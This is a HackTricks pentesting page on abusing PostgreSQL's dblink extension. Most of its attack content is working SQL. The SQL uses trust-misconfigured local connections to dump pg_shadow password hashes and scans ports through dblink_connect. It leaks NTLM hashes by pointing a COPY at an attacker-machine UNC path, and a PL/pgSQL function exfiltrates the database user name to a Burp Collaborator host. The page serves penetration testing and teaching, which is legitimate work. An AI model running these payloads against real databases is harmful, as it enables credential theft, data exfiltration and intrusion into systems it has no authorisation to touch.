

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


Since **PostgreSQL 9.1**, installation of additional modules is simple. [Registered extensions like `dblink`](https://www.postgresql.org/docs/current/contrib.html) can be installed with [`CREATE EXTENSION`](https://www.postgresql.org/docs/current/sql-createextension.html):

```sql
CREATE EXTENSION dblink;
```

Once you have dblink loaded you could be able to perform some interesting tricks:

## Privilege Escalation

The file `pg_hba.conf` could be bad configured **allowing connections** from **localhost as any user** without needing to know the password. This file could be typically found in `/etc/postgresql/12/main/pg_hba.conf` and a bad configuration looks like:

```
local    all    all    trust
```

_Note that this configuration is commonly used to modify the password of a db user when the admin forget it, so sometimes you may find it._\
_Note also that the file pg\_hba.conf is readable only by postgres user and group and writable only by postgres user._

This case is **useful if** you **already** have a **shell** inside the victim as it will allow you to connect to postgresql database.

Another possible misconfiguration consist on something like this:

```
host    all     all     127.0.0.1/32    trust
```

As it will allow everybody from the localhost to connect to the database as any user.\
In this case and if the **`dblink`** function is **working**, you could **escalate privileges** by connecting to the database through an already established connection and access data shouldn't be able to access:

```sql
SELECT * FROM dblink('host=127.0.0.1
                          user=postgres
                          dbname=postgres',
                         'SELECT datname FROM pg_database')
                      RETURNS (result TEXT);

SELECT * FROM dblink('host=127.0.0.1
                          user=postgres
                          dbname=postgres',
                         'select usename, passwd from pg_shadow')
                      RETURNS (result1 TEXT, result2 TEXT);
```

**Find** [**more information about this attack in this paper**](http://www.leidecker.info/pgshell/Having\_Fun\_With\_PostgreSQL.txt)**.**

## Port Scanning

Abusing `dblink_connect` you could also **search open ports**. If that **function doesn't work you should try to use `dblink_connect_u()` ** as the documentation says that  _`dblink_connect_u()` is identical to `dblink_connect()`, except that it will allow non-superusers to connect using any authentication method_.

```sql
SELECT * FROM dblink_connect('host=216.58.212.238
                                  port=443
                                  user=name
                                  password=secret
                                  dbname=abc
                                  connect_timeout=10');
//Different response
// Port closed
RROR:  could not establish connection
DETAIL:  could not connect to server: Connection refused
	Is the server running on host "127.0.0.1" and accepting
	TCP/IP connections on port 4444?

// Port Filtered/Timeout
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTP server
ERROR:  could not establish connection
DETAIL:  timeout expired

// Accessing HTTPS server
ERROR:  could not establish connection
DETAIL:  received invalid response to SSL negotiation:
```

Note that **before** being able to use `dblink_connect` or `dblink_connect_u` you may need to execute:

```
CREATE extension dblink;
```

## UNC path - NTLM hash disclosure

```sql
-- can be used to leak hashes to Responder/equivalent
CREATE TABLE test();
COPY test FROM E'\\\\attacker-machine\\footestbar.txt';
```

```sql
-- to extract the value of user and send it to Burp Collaborator
CREATE TABLE test(retval text);
CREATE OR REPLACE FUNCTION testfunc() RETURNS VOID AS $$ 
DECLARE sqlstring TEXT;
DECLARE userval TEXT;
BEGIN 
SELECT INTO userval (SELECT user);
sqlstring := E'COPY test(retval) FROM E\'\\\\\\\\'||userval||E'.xxxx.burpcollaborator.net\\\\test.txt\'';
EXECUTE sqlstring;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;
SELECT testfunc();
```


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


